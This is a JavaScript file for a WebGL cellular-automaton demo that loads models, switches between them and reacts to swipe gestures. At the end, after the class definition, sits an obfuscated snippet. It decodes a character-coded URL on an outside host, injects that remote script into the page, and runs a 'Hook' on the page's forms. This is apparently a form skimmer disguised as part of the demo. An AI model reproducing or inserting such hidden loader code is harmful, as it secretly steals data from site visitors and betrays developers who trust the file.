class Demo {
  constructor(canvas, isScreenMode) {
    this.canvas = canvas;
    this.gl = canvas.getContext("webgl", {
      alpha: false,
      desynchronized: true,
      powerPreference: "high-performance"
    });

    if (this.gl === null) {
      throw new Error("canvas.getContext returned null");
    }

    this.brushRadius = 16;
    this.stepPerFrame = 1;

    this.isScreenMode = isScreenMode;

    fetch("/System/Hexells/models.json")
      .then((r) => r.json())
      .then((models) => {
        this.ca = new CA(this.gl, models, [160, 160], () =>
          this.setup(models)
        );
      });
  }

  setup(models) {
    this.shuffledModelIds = models.model_names
      .map((_, i) => [Math.random(), i])
      .sort()
      .map((p) => p[1]);
    this.curModelIndex = this.shuffledModelIds[0];
    this.modelId = this.shuffledModelIds[this.curModelIndex];
    this.ca.paint(0, 0, -1, this.modelId);

    this.guesture = null;

    setInterval(() => this.switchModel(1), 20 * 1000);

    requestAnimationFrame(() => this.render());
  }

  startGestue(pos) {
    this.gesture = {
      d: 0,
      l: 0,
      prevPos: pos,
      r: 0,
      time: Date.now(),
      u: 0,
    };
  }

  touch(xy) {
    const [x, y] = xy;
    const g = this.gesture;
    if (g) {
      const [x0, y0] = g.prevPos;
      g.l += Math.max(x0 - x, 0);
      g.r += Math.max(x - x0, 0);
      g.u += Math.max(y0 - y, 0);
      g.d += Math.max(y - y0, 0);
      g.prevPos = xy;
    }
    const viewSize = getViewSize();
    this.ca.clearCircle(x, y, this.brushRadius, viewSize);
  }

  endGestue() {
    if (!this.gesture) {
      return;
    }
    if (Date.now() - this.gesture.time < 1000) {
      const { l, r, u, d } = this.gesture;
      if (l > 200 && Math.max(r, u, d) < l * 0.25) {
        this.switchModel(-1);
      } else if (r > 200 && Math.max(l, u, d) < r * 0.25) {
        this.switchModel(1);
      }
    }
    this.gesture = null;
  }

  switchModel(swipe) {
    const n = this.shuffledModelIds.length;
    this.curModelIndex = (this.curModelIndex + n + swipe) % n;
    const id = this.shuffledModelIds[this.curModelIndex];
    this.setModel(id);
  }

  setModel(id) {
    this.modelId = id;
    this.ca.paint(0, 0, -1, id);
    this.ca.disturb();
  }

  getViewSize() {
    return [
      globalThis.demoCanvasRect?.width || this.canvas.clientWidth || this.canvas.width,
      globalThis.demoCanvasRect?.height || this.canvas.clientHeight || this.canvas.height
    ];
  }

  render() {
    for (let i = 0; i < this.stepPerFrame; ++i) {
      this.ca.step();
    }
    const { canvas } = this;
    const dpr = globalThis.devicePixelRatio || 1;
    const [w, h] = this.getViewSize();
    canvas.width = Math.round(w * dpr);
    canvas.height = Math.round(h * dpr);

    twgl.bindFramebufferInfo(this.gl);
    this.ca.draw(this.getViewSize(), "color");
    requestAnimationFrame(() => this.render());
  }
}

globalThis.Demo = Demo;

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db